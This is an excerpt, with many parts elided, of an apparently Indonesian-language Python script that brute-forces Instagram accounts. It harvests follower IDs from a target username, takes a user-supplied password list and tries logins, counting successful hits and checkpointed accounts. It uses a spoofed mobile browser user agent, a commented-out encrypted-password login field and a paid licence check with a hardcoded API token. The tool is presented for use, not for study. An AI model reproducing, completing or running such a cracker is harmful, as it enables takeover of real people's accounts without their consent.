...
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 9; HarmonyOS; JKM-AL00b; HMSCore 6.4.0.311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.3.300 Mobile Safari/537.36 Instagram 214.0.0.27.120 Android (29/10; 420dpi; 1080x2186; samsung; SM-A515F; a51; exynos9611; it_IT; 332901678)"
...
[{H}•{C}]Following      : {following}'''
    ...
    def BUG(self):
        bug=f'[❤️] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[❤️] Anda bisa melaporkan langsung ke wa admin \n'
    ...
    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                idtar=f'# [❤️] TUNGGU SEDANG MENGUMPULKAN ID [❤️]'
    ...
    def passwordAPI(self,xnx):
        idtar=f'# [❤️] TOTAL ID  : {len(internal)} [❤️]'
        idtar1=mark(idtar,style='yellow')
        sol().print(idtar1)
        ...
        cetak(nel(komb1))
        c=input(f'{CY}[❤️] Masukan Pilihan :{C} ')
        if c=='1':
            ...
            print('')
            zx=input(f'{CY}[❤️] List password :{C} ')
    ...
    def crackAPI(self,user,pas):
        ...
        sys.stdout.write(f"\r{CY}[❤️] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                ...
                if "userId" in str(x_jason):
                    ...
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title='ALLIANCE LIVE'))
...
def lisensi():
    ...
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIxODc3OTc4MiIsIlROSVowQnF4UDZPRDRCODA1dHI5by9OYVFmaHU4ZFpJNm80S1dXOEQiXQ==&ProductId=15246&Key='+lisensikuni[0]).json()
...
def meng(self):
    ...
    mas1=mark(mas,style='red')
    sol().print(mas1)
    m=input(f'{CY}[❤️] Username target : {C}')
